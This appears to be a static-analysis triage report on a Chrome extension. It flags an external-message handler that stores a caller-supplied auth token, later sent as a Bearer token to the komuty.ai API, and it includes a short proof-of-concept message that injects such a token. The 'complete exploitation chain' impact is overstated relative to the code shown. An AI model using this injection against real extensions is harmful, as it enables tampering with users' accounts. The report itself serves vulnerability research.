# CoCo Analysis: ogpoppjcfphaohjejaekkleeidejccaa

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink)

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ogpoppjcfphaohjejaekkleeidejccaa/opgen_generated_files/bg.js
Line 1041: `chrome.storage.local.set({ tab_id: tabid, token: request.token })`

**Code:**

```javascript
// Background script - External message handler (bg.js line 1030-1055)
chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
    if (request.action == "pingKomutyApp") {
        sendResponse({ status: 0 });
    }

    if (request.action === "startTikBot") {
        chrome.storage.local.set({ tab_id: -1, token: '' }).then(() => {
            chrome.windows.create({ url: request.url, type: 'normal' }, (newWindow) => {
                if (newWindow.tabs && newWindow.tabs.length > 0) {
                  const tabid = newWindow.tabs[0].id;
                  chrome.storage.local.set({ tab_id: tabid, token: request.token }) // ← attacker-controlled token stored
                } else {
                  console.error('No tabs found in the new window');
                }
            });
        })
    }

    return true;
});

// Content script - Reads token from storage (cs_0.js line 501-504)
async function _getToken(){
    var result = await chrome.storage.local.get(['token']);
    return result.token; // ← retrieves poisoned token
}

// Content script - Uses token in API requests (cs_0.js line 554-579)
async function _enAccount(username){
    var token = await _getToken(); // ← gets poisoned token
    if (token == '') { return {status: -3}}

    const url = 'https://api.komuty.ai/enable_account';

    const data = {
        account: username,
        socmed: 'tiktok'
    };

    const options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer '+token // ← attacker's token used in API call
        },
        body: JSON.stringify(data)
    };

    try {
        var response = await fetch(url, options) // ← privileged request with attacker token
        // ... handles response
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From komuty.ai domain (or any whitelisted origin):
chrome.runtime.sendMessage(
    'ogpoppjcfphaohjejaekkleeidejccaa', // extension ID
    {
        action: "startTikBot",
        url: "https://www.tiktok.com/",
        token: "attacker_controlled_token_value" // ← inject malicious token
    }
);

// The extension stores the attacker's token in storage.
// When the content script runs on tiktok.com, it retrieves this poisoned token
// and uses it in Authorization headers for API calls to komuty.ai backend.
// This allows the attacker to:
// 1. Impersonate the extension with their own API token
// 2. Control what actions the extension performs via their API
// 3. Potentially access or manipulate data through the compromised API token
```

**Impact:** Complete storage exploitation chain - attacker poisons the authentication token in storage, which is then retrieved by the content script and used in privileged API requests to the backend server. This allows the attacker to control the extension's authentication context and manipulate its interactions with the komuty.ai API.
